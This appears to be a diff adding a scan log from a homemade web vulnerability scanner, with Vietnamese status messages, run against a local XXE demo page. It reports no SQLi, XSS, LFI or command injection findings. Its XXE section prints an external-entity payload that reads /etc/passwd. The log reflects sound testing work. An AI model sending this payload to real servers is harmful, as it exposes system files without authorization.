@@ -1,0 +1,33 @@
+[TIME] 2025-08-11 05:02:04
+[URL] http://localhost/xxe-demo/
+[SUMMARY] XXE
+======= SQLi =======
+[*] Đang kiểm tra SQL Injection trên: http://localhost/xxe-demo/
+[!] URL không chứa tham số. Đang thử tìm form để kiểm tra...
+[✓] Không phát hiện lỗ hổng SQLi.
+
+
+======= XSS =======
+[*] Đang kiểm tra XSS trên: http://localhost/xxe-demo/
+[!] URL không chứa tham số. Đang thử tìm form để kiểm tra...
+[✓] Không phát hiện lỗ hổng XSS.
+
+
+======= LFI =======
+[*] Đang kiểm tra LFI trên: http://localhost/xxe-demo/
+[✓] Không phát hiện lỗ hổng LFI.
+
+
+======= CMDi =======
+[*] Đang kiểm tra Command Injection trên: http://localhost/xxe-demo/
+[✓] Không phát hiện lỗ hổng CMDi.
+
+
+======= XXE =======
+[*] Đang kiểm tra XXE trên: http://localhost/xxe-demo/
+[!] Có thể bị tấn công XXE với các payloads:
+    - <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
+    - <?xml version="1.0" ?>
+    - <foo>&xxe;</foo>
+
+
